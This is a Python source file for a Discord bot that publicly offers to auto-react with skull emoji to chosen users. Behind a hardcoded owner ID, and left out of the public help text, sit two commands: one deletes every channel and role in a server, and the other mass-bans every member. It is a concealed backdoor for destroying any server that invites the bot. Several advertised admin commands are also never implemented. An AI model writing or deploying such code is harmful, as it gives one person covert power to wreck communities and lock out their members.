import discord
import os
from dotenv import load_dotenv
from threading import Thread
from flask import Flask

# Load environment variables
load_dotenv()
TOKEN = os.getenv("DISCORD_TOKEN")

if not TOKEN:
    raise ValueError("Bot token is missing. Make sure you set it in the .env file.")

# Replace with your Discord User ID
YOUR_USER_ID = 1212229549459374222  # Change this to your actual Discord ID

# List of authorized user IDs who can use bot commands
AUTHORIZED_USERS = {YOUR_USER_ID, 845578292778238002, 1177672910102614127}  # Add more user IDs as needed
BLACKLISTED_USERS = set()
WHITELISTED_USERS = set()

# Set up intents
intents = discord.Intents.default()
intents.message_content = True
intents.guilds = True
intents.members = True
intents.dm_messages = True  # Enable DM message handling

# Initialize bot
class AutoSkullBot(discord.Client):
    def __init__(self, **kwargs):
        super().__init__(**kwargs)
        self.user_skull_list = set()  # Store user IDs to auto-react to their new messages

bot = AutoSkullBot(intents=intents)

# Keep the bot running with Flask
app = Flask(__name__)

@app.route('/')
def home():
    return "I'm alive!"

def run():
    app.run(host='0.0.0.0', port=8080)

def keep_alive():
    t = Thread(target=run)
    t.start()

keep_alive()  # Keep the bot alive

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user}")
    await bot.change_presence(activity=discord.Game(name="if you're worthy, you shall be skulled"))

@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    if isinstance(message.channel, discord.DMChannel):
        print(f"DM from {message.author}: {message.content}")

    if message.author.id in bot.user_skull_list:
        await message.add_reaction("\u2620️")  # Skull reaction

    if message.content.startswith("!skull"):
        if message.author.id in BLACKLISTED_USERS:
            await message.channel.send("You are blacklisted from using this bot.")
            return

        args = message.content.split()

        # General Commands
        if len(args) == 2 and args[1] == "list":
            skull_users = [f'<@{user_id}>' for user_id in bot.user_skull_list]
            await message.channel.send(f"Users being skulled: {', '.join(skull_users)}" if skull_users else "No users are currently being skulled.")
            return

        if len(args) == 2 and args[1] == "help":
            help_message = (
                "**Available Commands:**\n"
                "`!skull @user` - Skull a user.\n"
                "`!skull stop @user` - Stop skulling a user.\n"
                "`!skull list` - Show users being skulled.\n"
                "`!skull help` - Show this help message."
            )
            await message.channel.send(help_message)
            return

        # Admin Commands
        if message.author.id == YOUR_USER_ID:
            if len(args) == 2 and args[1] == "admin":
                admin_message = (
                    "**Admin Commands:**\n"
                    "`!skull authorize @user` - Authorize a user.\n"
                    "`!skull authorized` - Show authorized users.\n"
                    "`!skull unauthorize @user` - Remove user from authorized list.\n"
                    "`!skull whitelist @user` - Allow a user to use the bot in their own server.\n"
                    "`!skull blacklist @user` - Prevent a user from using the bot.\n"
                    "`!kaboom` - Delete all channels and roles (requires confirmation).\n"
                    "`!bankai` - Mass ban all members in the server (requires confirmation)."
                )
                await message.channel.send(admin_message)
                return

            # Dangerous Commands
            if len(args) == 2 and args[1] == "kaboom":
                await message.channel.send("Are you sure you want to delete all channels and roles? Type `YES` to confirm.")
                def check(m):
                    return m.author == message.author and m.content.upper() == "YES"
                response = await bot.wait_for("message", check=check)
                for channel in message.guild.channels:
                    await channel.delete()
                for role in message.guild.roles:
                    if role.name != "@everyone":
                        await role.delete()
                await message.channel.send("All channels and roles have been deleted!")
                return

            if len(args) == 2 and args[1] == "bankai":
                await message.channel.send("Are you sure you want to mass ban all members? Type `YES` to confirm.")
                def check(m):
                    return m.author == message.author and m.content.upper() == "YES"
                response = await bot.wait_for("message", check=check)
                for member in message.guild.members:
                    if member != bot.user:
                        await member.ban(reason="Mass ban initiated by admin.")
                await message.channel.send("All members have been banned!")
                return

        # Skull a user
        if len(args) == 2:
            mentioned_users = message.mentions
            if mentioned_users:
                for user in mentioned_users:
                    bot.user_skull_list.add(user.id)
                await message.channel.send(f"Will skull {', '.join([user.mention for user in mentioned_users])} from now on ☠️")
            else:
                await message.channel.send("Please mention a user to skull!")

        # Stop skulling a user
        if len(args) == 3 and args[1].lower() == "stop":
            user = message.mentions[0] if message.mentions else None
            if user and user.id in bot.user_skull_list:
                bot.user_skull_list.remove(user.id)
                await message.channel.send(f"{user.mention} will no longer be skulled.")
            return

# Run the bot
bot.run(TOKEN)
